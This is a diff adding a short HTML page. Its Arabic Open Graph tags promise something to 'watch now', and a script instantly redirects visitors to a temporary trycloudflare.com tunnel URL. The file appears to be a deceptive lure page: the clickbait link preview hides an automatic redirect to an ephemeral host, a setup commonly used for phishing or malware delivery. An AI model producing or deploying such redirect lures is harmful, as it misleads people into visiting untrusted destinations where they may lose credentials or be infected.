@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- Open Graph Tags -->
+    <meta property="og:title" content="شاهد الآن" />
+    <meta property="og:description" content="انتظر لحظات، سيتم التحويل الآن." />
+    <meta property="og:image" content="https://i.postimg.cc/8zWZ9LHY/IMG-1010.jpg" />
+    <meta property="og:url" content="https://thumbs-decor-speaks-bizrate.trycloudflare.com" />
+    <meta property="og:type" content="website" />
+
+    <title>Redirecting...</title>
+  
+    <!-- Optional: Redirect -->
+    <script>
+        window.location.href =  "https://thumbs-decor-speaks-bizrate.trycloudflare.com"
+    </script>
+</head>
+<body>
+    <p>شاهد الآن</p>
+</body>
+</html>
